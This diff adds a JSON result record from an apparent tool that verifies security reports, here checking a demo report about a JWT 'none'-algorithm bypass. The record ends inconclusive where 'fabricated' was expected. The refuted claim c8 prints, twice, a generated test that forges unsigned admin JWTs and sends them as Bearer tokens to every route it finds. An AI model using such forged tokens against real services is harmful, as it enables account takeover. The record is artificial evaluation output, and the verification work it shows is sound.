@@ -1,0 +1,844 @@
+{
+  "timestamp": "20261103T155858Z",
+  "expected": "fabricated",
+  "got": "inconclusive",
+  "match": false,
+  "error": null,
+  "report": "demo\\reports\\01_fabricated_jwt.md",
+  "repo": "demo/target_app",
+  "version": "demo-v1",
+  "claims": [
+    {
+      "id": "c1",
+      "kind": "symbol_exists",
+      "statement": "The function verify_jwt_signature exists.",
+      "target": {
+        "symbol": "verify_jwt_signature"
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c2",
+      "kind": "location",
+      "statement": "verify_jwt_signature is located inside app/auth/jwt_verify.py around line 44.",
+      "target": {
+        "file": "app/auth/jwt_verify.py",
+        "symbol": "verify_jwt_signature",
+        "line": 44
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c3",
+      "kind": "version_affected",
+      "statement": "demo-v1 is affected.",
+      "target": {
+        "version": "demo-v1"
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c4",
+      "kind": "data_flow",
+      "statement": "The JWT from the Authorization header is decoded by verify_jwt_signature.",
+      "target": {
+        "symbol": "verify_jwt_signature"
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c5",
+      "kind": "code_property",
+      "statement": "verify_jwt_signature calls the token parser with algorithms=[\"HS256\", \"none\"], thereby accepting the none algorithm.",
+      "target": {
+        "file": "app/auth/jwt_verify.py",
+        "symbol": "verify_jwt_signature"
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c6",
+      "kind": "code_property",
+      "statement": "When the algorithm header is none, verify_jwt_signature skips signature verification entirely and returns the embedded claims.",
+      "target": {
+        "file": "app/auth/jwt_verify.py",
+        "symbol": "verify_jwt_signature"
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c7",
+      "kind": "code_property",
+      "statement": "verify_jwt_signature has no allowlist of trusted issuers.",
+      "target": {
+        "file": "app/auth/jwt_verify.py",
+        "symbol": "verify_jwt_signature"
+      },
+      "check_method": "static"
+    },
+    {
+      "id": "c8",
+      "kind": "reproducible_impact",
+      "statement": "Sending Authorization: Bearer with an unsigned admin token to demo-v1 returns an admin session, achieving full account takeover with no secret.",
+      "target": {
+        "version": "demo-v1"
+      },
+      "check_method": "test"
+    }
+  ],
+  "evidence": [
+    {
+      "claim_id": "c1",
+      "status": "unverifiable",
+      "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c2",
+      "status": "unverifiable",
+      "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c3",
+      "status": "unverifiable",
+      "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c4",
+      "status": "unverifiable",
+      "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c5",
+      "status": "unverifiable",
+      "summary": "Target file app/auth/jwt_verify.py does not exist and find_symbol found no matches and no close matches for verify_jwt_signature; searches for HS256, jwt, and algorithms returned no results so the alleged algorithms list cannot be confirmed.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c6",
+      "status": "unverifiable",
+      "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c7",
+      "status": "unverifiable",
+      "summary": "verify_jwt_signature was not found with no close matches and app/auth/jwt_verify.py does not exist; searches for verify_jwt_signature, jwt, and verify returned no results, so the absence of an issuer allowlist cannot be confirmed from code.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": null
+    },
+    {
+      "claim_id": "c8",
+      "status": "refuted",
+      "summary": "Sandbox reproduction test failed: the claimed behavior did not reproduce.",
+      "file": null,
+      "line_start": null,
+      "line_end": null,
+      "snippet": null,
+      "test_log": "# generated sandbox test (test_proofgate_repro.py):\nimport base64\nimport importlib\nimport json\nimport os\n\ndef _b64(o):\n    b = json.dumps(o, separators=(\",\", \":\")).encode()\n    return base64.urlsafe_b64encode(b).decode().rstrip(\"=\")\n\ndef _try_import(n):\n    try:\n        return importlib.import_module(n)\n    except Exception:\n        return None\n\ndef _collect_mods():\n    mods = []\n    for n in [\"app\", \"main\", \"server\", \"api\", \"web\", \"demo\", \"application\", \"auth\"]:\n        m = _try_import(n)\n        if m is not None:\n            mods.append(m)\n    try:\n        entries = os.listdir(\".\")\n    except Exception:\n        entries = []\n    for e in entries:\n        if e.endswith(\".py\"):\n            n = e[:-3]\n            if n.startswith(\"test_\"):\n                continue\n            m = _try_import(n)\n            if m is not None and m not in mods:\n                mods.append(m)\n        else:\n            try:\n                isdir = os.path.isdir(e)\n            except Exception:\n                isdir = False\n            if isdir:\n                try:\n                    inner = os.listdir(e)\n                except Exception:\n                    inner = []\n                if \"__init__.py\" in inner:\n                    m = _try_import(e)\n                    if m is not None and m not in mods:\n                        mods.append(m)\n    return mods\n\ndef _apps_from_mod(mod):\n    out = []\n    for attr in [\"app\", \"application\", \"flask_app\", \"server\"]:\n        try:\n            has = hasattr(mod, attr)\n        except Exception:\n            has = False\n        if has:\n            v = getattr(mod, attr)\n            if hasattr(v, \"test_client\") and hasattr(v, \"url_map\"):\n                if v not in out:\n                    out.append(v)\n    try:\n        has_factory = hasattr(mod, \"create_app\")\n    except Exception:\n        has_factory = False\n    if has_factory:\n        try:\n            v = mod.create_app()\n            if hasattr(v, \"test_client\"):\n                if v not in out:\n                    out.append(v)\n        except Exception:\n            pass\n    try:\n        vals = list(vars(mod).values())\n    except Exception:\n        vals = []\n    for v in vals:\n        try:\n            ok = hasattr(v, \"test_client\") and hasattr(v, \"url_map\")\n        except Exception:\n            ok = False\n        if ok and v not in out:\n            out.append(v)\n    return out\n\ndef _concrete(p):\n    r = \"\"\n    skip = False\n    for ch in p:\n        if ch == \"<\":\n            skip = True\n            r = r + \"1\"\n        elif ch == \">\":\n            skip = False\n        elif not skip:\n            r = r + ch\n    return r\n\ndef _routes(app):\n    paths = []\n    try:\n        rules = list(app.url_map.iter_rules())\n    except Exception:\n        rules = []\n    for rule in rules:\n        try:\n            s = str(rule)\n        except Exception:\n            continue\n        if \"static\" in s:\n            continue\n        paths.append(s)\n    for c in [\"/\", \"/me\", \"/profile\", \"/admin\", \"/api/me\", \"/session\", \"/whoami\", \"/user\"]:\n        if c not in paths:\n            paths.append(c)\n    return paths[:25]\n\ndef _is_admin(resp):\n    try:\n        code = resp.status_code\n    except Exception:\n        return False\n    if code != 200:\n        return False\n    try:\n        data = resp.data\n    except Exception:\n        return False\n    try:\n        txt = data.decode(errors=\"ignore\").lower()\n    except Exception:\n        return False\n    if \"admin\" not in txt:\n        return False\n    return True\n\ndef _tokens():\n    hb = _b64({\"alg\": \"none\", \"typ\": \"JWT\"})\n    payloads = [\n        {\"admin\": True},\n        {\"is_admin\": True},\n        {\"role\": \"admin\"},\n        {\"username\": \"admin\"},\n        {\"sub\": \"admin\"},\n        {\"user\": \"admin\"},\n        {\"admin\": True, \"sub\": \"admin\"},\n        {\"role\": \"admin\", \"sub\": \"admin\"},\n    ]\n    toks = []\n    for p in payloads:\n        pb = _b64(p)\n        toks.append(hb + \".\" + pb + \".\")\n        toks.append(hb + \".\" + pb)\n    return toks\n\ndef test_unsigned_admin_takeover():\n    mods = _collect_mods()\n    apps = []\n    for m in mods:\n        for a in _apps_from_mod(m):\n            if a not in apps:\n                apps.append(a)\n    assert len(apps) > 0\n    toks = _tokens()\n    for app in apps:\n        try:\n            paths = _routes(app)\n        except Exception:\n            continue\n        try:\n            client = app.test_client()\n        except Exception:\n            continue\n        for path in paths:\n            cpath = _concrete(path)\n            try:\n                base = client.get(cpath)\n            except Exception:\n                continue\n            if _is_admin(base):\n                continue\n            for tok in toks:\n                try:\n                    r = client.get(cpath, headers={\"Authorization\": \"Bearer \" + tok})\n                except Exception:\n                    continue\n                if _is_admin(r):\n                    return\n    assert False\n\n# outcome: FAIL in 1.8s\n# --- pytest output ---\nF                                                                        [100%]\n================================== FAILURES ===================================\n________________________ test_unsigned_admin_takeover _________________________\n\n    def test_unsigned_admin_takeover():\n        mods = _collect_mods()\n        apps = []\n        for m in mods:\n            for a in _apps_from_mod(m):\n                if a not in apps:\n                    apps.append(a)\n        assert len(apps) > 0\n        toks = _tokens()\n        for app in apps:\n            try:\n                paths = _routes(app)\n            except Exception:\n                continue\n            try:\n                client = app.test_client()\n            except Exception:\n                continue\n            for path in paths:\n                cpath = _concrete(path)\n                try:\n                    base = client.get(cpath)\n                except Exception:\n                    continue\n                if _is_admin(base):\n                    continue\n                for tok in toks:\n                    try:\n                        r = client.get(cpath, headers={\"Authorization\": \"Bearer \" + tok})\n                    except Exception:\n                        continue\n                    if _is_admin(r):\n                        return\n>       assert False\nE       assert False\n\ntest_proofgate_repro.py:190: AssertionError\n=========================== short test summary info ===========================\nFAILED test_proofgate_repro.py::test_unsigned_admin_takeover - assert False\n1 failed in 0.42s"
+    }
+  ],
+  "verdict": {
+    "label": "inconclusive",
+    "evidence_level": 0,
+    "rationale": "All core code claims c1-c7 are unverifiable, with c5 and c7 noting the file and symbol were not found but not marking them refuted, so fabrication cannot be established. Only c8 is refuted by a failed sandbox reproduction, and with no supported claims the evidence does not settle whether the code exists or has the claimed properties. Manual triage of this report would take about 20 minutes (estimate).",
+    "per_claim": [
+      {
+        "claim_id": "c1",
+        "status": "unverifiable",
+        "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c2",
+        "status": "unverifiable",
+        "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c3",
+        "status": "unverifiable",
+        "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c4",
+        "status": "unverifiable",
+        "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c5",
+        "status": "unverifiable",
+        "summary": "Target file app/auth/jwt_verify.py does not exist and find_symbol found no matches and no close matches for verify_jwt_signature; searches for HS256, jwt, and algorithms returned no results so the alleged algorithms list cannot be confirmed.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c6",
+        "status": "unverifiable",
+        "summary": "Tool budget exhausted before the checker gathered enough evidence; left unverifiable rather than guessing.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c7",
+        "status": "unverifiable",
+        "summary": "verify_jwt_signature was not found with no close matches and app/auth/jwt_verify.py does not exist; searches for verify_jwt_signature, jwt, and verify returned no results, so the absence of an issuer allowlist cannot be confirmed from code.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": null
+      },
+      {
+        "claim_id": "c8",
+        "status": "refuted",
+        "summary": "Sandbox reproduction test failed: the claimed behavior did not reproduce.",
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "snippet": null,
+        "test_log": "# generated sandbox test (test_proofgate_repro.py):\nimport base64\nimport importlib\nimport json\nimport os\n\ndef _b64(o):\n    b = json.dumps(o, separators=(\",\", \":\")).encode()\n    return base64.urlsafe_b64encode(b).decode().rstrip(\"=\")\n\ndef _try_import(n):\n    try:\n        return importlib.import_module(n)\n    except Exception:\n        return None\n\ndef _collect_mods():\n    mods = []\n    for n in [\"app\", \"main\", \"server\", \"api\", \"web\", \"demo\", \"application\", \"auth\"]:\n        m = _try_import(n)\n        if m is not None:\n            mods.append(m)\n    try:\n        entries = os.listdir(\".\")\n    except Exception:\n        entries = []\n    for e in entries:\n        if e.endswith(\".py\"):\n            n = e[:-3]\n            if n.startswith(\"test_\"):\n                continue\n            m = _try_import(n)\n            if m is not None and m not in mods:\n                mods.append(m)\n        else:\n            try:\n                isdir = os.path.isdir(e)\n            except Exception:\n                isdir = False\n            if isdir:\n                try:\n                    inner = os.listdir(e)\n                except Exception:\n                    inner = []\n                if \"__init__.py\" in inner:\n                    m = _try_import(e)\n                    if m is not None and m not in mods:\n                        mods.append(m)\n    return mods\n\ndef _apps_from_mod(mod):\n    out = []\n    for attr in [\"app\", \"application\", \"flask_app\", \"server\"]:\n        try:\n            has = hasattr(mod, attr)\n        except Exception:\n            has = False\n        if has:\n            v = getattr(mod, attr)\n            if hasattr(v, \"test_client\") and hasattr(v, \"url_map\"):\n                if v not in out:\n                    out.append(v)\n    try:\n        has_factory = hasattr(mod, \"create_app\")\n    except Exception:\n        has_factory = False\n    if has_factory:\n        try:\n            v = mod.create_app()\n            if hasattr(v, \"test_client\"):\n                if v not in out:\n                    out.append(v)\n        except Exception:\n            pass\n    try:\n        vals = list(vars(mod).values())\n    except Exception:\n        vals = []\n    for v in vals:\n        try:\n            ok = hasattr(v, \"test_client\") and hasattr(v, \"url_map\")\n        except Exception:\n            ok = False\n        if ok and v not in out:\n            out.append(v)\n    return out\n\ndef _concrete(p):\n    r = \"\"\n    skip = False\n    for ch in p:\n        if ch == \"<\":\n            skip = True\n            r = r + \"1\"\n        elif ch == \">\":\n            skip = False\n        elif not skip:\n            r = r + ch\n    return r\n\ndef _routes(app):\n    paths = []\n    try:\n        rules = list(app.url_map.iter_rules())\n    except Exception:\n        rules = []\n    for rule in rules:\n        try:\n            s = str(rule)\n        except Exception:\n            continue\n        if \"static\" in s:\n            continue\n        paths.append(s)\n    for c in [\"/\", \"/me\", \"/profile\", \"/admin\", \"/api/me\", \"/session\", \"/whoami\", \"/user\"]:\n        if c not in paths:\n            paths.append(c)\n    return paths[:25]\n\ndef _is_admin(resp):\n    try:\n        code = resp.status_code\n    except Exception:\n        return False\n    if code != 200:\n        return False\n    try:\n        data = resp.data\n    except Exception:\n        return False\n    try:\n        txt = data.decode(errors=\"ignore\").lower()\n    except Exception:\n        return False\n    if \"admin\" not in txt:\n        return False\n    return True\n\ndef _tokens():\n    hb = _b64({\"alg\": \"none\", \"typ\": \"JWT\"})\n    payloads = [\n        {\"admin\": True},\n        {\"is_admin\": True},\n        {\"role\": \"admin\"},\n        {\"username\": \"admin\"},\n        {\"sub\": \"admin\"},\n        {\"user\": \"admin\"},\n        {\"admin\": True, \"sub\": \"admin\"},\n        {\"role\": \"admin\", \"sub\": \"admin\"},\n    ]\n    toks = []\n    for p in payloads:\n        pb = _b64(p)\n        toks.append(hb + \".\" + pb + \".\")\n        toks.append(hb + \".\" + pb)\n    return toks\n\ndef test_unsigned_admin_takeover():\n    mods = _collect_mods()\n    apps = []\n    for m in mods:\n        for a in _apps_from_mod(m):\n            if a not in apps:\n                apps.append(a)\n    assert len(apps) > 0\n    toks = _tokens()\n    for app in apps:\n        try:\n            paths = _routes(app)\n        except Exception:\n            continue\n        try:\n            client = app.test_client()\n        except Exception:\n            continue\n        for path in paths:\n            cpath = _concrete(path)\n            try:\n                base = client.get(cpath)\n            except Exception:\n                continue\n            if _is_admin(base):\n                continue\n            for tok in toks:\n                try:\n                    r = client.get(cpath, headers={\"Authorization\": \"Bearer \" + tok})\n                except Exception:\n                    continue\n                if _is_admin(r):\n                    return\n    assert False\n\n# outcome: FAIL in 1.8s\n# --- pytest output ---\nF                                                                        [100%]\n================================== FAILURES ===================================\n________________________ test_unsigned_admin_takeover _________________________\n\n    def test_unsigned_admin_takeover():\n        mods = _collect_mods()\n        apps = []\n        for m in mods:\n            for a in _apps_from_mod(m):\n                if a not in apps:\n                    apps.append(a)\n        assert len(apps) > 0\n        toks = _tokens()\n        for app in apps:\n            try:\n                paths = _routes(app)\n            except Exception:\n                continue\n            try:\n                client = app.test_client()\n            except Exception:\n                continue\n            for path in paths:\n                cpath = _concrete(path)\n                try:\n                    base = client.get(cpath)\n                except Exception:\n                    continue\n                if _is_admin(base):\n                    continue\n                for tok in toks:\n                    try:\n                        r = client.get(cpath, headers={\"Authorization\": \"Bearer \" + tok})\n                    except Exception:\n                        continue\n                    if _is_admin(r):\n                        return\n>       assert False\nE       assert False\n\ntest_proofgate_repro.py:190: AssertionError\n=========================== short test summary info ===========================\nFAILED test_proofgate_repro.py::test_unsigned_admin_takeover - assert False\n1 failed in 0.42s"
+      }
+    ],
+    "minutes_saved_estimate": 20.0
+  },
+  "tool_log": [
+    {
+      "claim_id": "c1",
+      "turn": 0,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c1",
+      "turn": 1,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify_jwt_signature",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c1",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c1",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "def ",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c1",
+      "turn": 4,
+      "tool": "read_file",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c1",
+      "turn": 5,
+      "tool": "read_file",
+      "arguments": {
+        "end": 180,
+        "path": "app.py",
+        "start": 1
+      }
+    },
+    {
+      "claim_id": "c1",
+      "turn": 6,
+      "tool": "read_file",
+      "arguments": {
+        "end": 120,
+        "path": "app.py",
+        "start": 1
+      }
+    },
+    {
+      "claim_id": "c1",
+      "turn": 7,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 0,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 0,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 1,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 2,
+      "tool": "read_file",
+      "arguments": {
+        "end": 70,
+        "path": "app/auth/jwt_verify.py",
+        "start": 1
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "pattern": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 4,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c2",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "jwt_verify"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify_jwt"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 4,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 5,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c2",
+      "turn": 6,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c2",
+      "turn": 7,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "jwt"
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 0,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c3",
+      "turn": 1,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "demo-v1",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "v1",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "a",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 4,
+      "tool": "read_file",
+      "arguments": {
+        "end": 120,
+        "path": "app.py",
+        "start": 1
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 5,
+      "tool": "read_file",
+      "arguments": {
+        "end": 180,
+        "path": "app.py",
+        "start": 99
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 6,
+      "tool": "read_file",
+      "arguments": {
+        "end": 155,
+        "path": "app.py",
+        "start": 115
+      }
+    },
+    {
+      "claim_id": "c3",
+      "turn": 7,
+      "tool": "read_file",
+      "arguments": {
+        "end": 155,
+        "path": "app.py",
+        "start": 115
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 0,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 1,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify_jwt_signature",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "Authorization",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "jwt",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 3,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c4",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "def",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 5,
+      "tool": "read_file",
+      "arguments": {
+        "path": "app.py",
+        "start": 1,
+        "end": 120
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 6,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c4",
+      "turn": 7,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 0,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 1,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify_jwt_signature",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "HS256",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "jwt",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "algorithms",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c5",
+      "turn": 3,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c5",
+      "turn": 4,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c6",
+      "turn": 0,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 0,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 1,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify_jwt_signature",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 2,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c6",
+      "turn": 3,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "jwt",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "signature",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "alg",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "auth",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 5,
+      "tool": "read_file",
+      "arguments": {
+        "end": 200,
+        "path": "app.py",
+        "start": 1
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 6,
+      "tool": "read_file",
+      "arguments": {
+        "end": 120,
+        "path": "app.py",
+        "start": 1
+      }
+    },
+    {
+      "claim_id": "c6",
+      "turn": 7,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c7",
+      "turn": 0,
+      "tool": "find_symbol",
+      "arguments": {
+        "name": "verify_jwt_signature"
+      }
+    },
+    {
+      "claim_id": "c7",
+      "turn": 0,
+      "tool": "file_exists",
+      "arguments": {
+        "path": "app/auth/jwt_verify.py"
+      }
+    },
+    {
+      "claim_id": "c7",
+      "turn": 1,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify_jwt_signature",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c7",
+      "turn": 2,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "jwt",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c7",
+      "turn": 3,
+      "tool": "list_versions",
+      "arguments": {}
+    },
+    {
+      "claim_id": "c7",
+      "turn": 4,
+      "tool": "search_code",
+      "arguments": {
+        "max_results": 20,
+        "pattern": "verify",
+        "regex": false
+      }
+    },
+    {
+      "claim_id": "c7",
+      "turn": 5,
+      "tool": "read_file",
+      "arguments": {
+        "end": 120,
+        "path": "app/auth/jwt_verify.py",
+        "start": 1
+      }
+    }
+  ],
+  "usage": {
+    "prompt_tokens": 96989,
+    "completion_tokens": 70619,
+    "total_tokens": 167608,
+    "requests": 56
+  },
+  "seconds": 293.5971296997741,
+  "cost_usd_estimate": 1.350252
+}
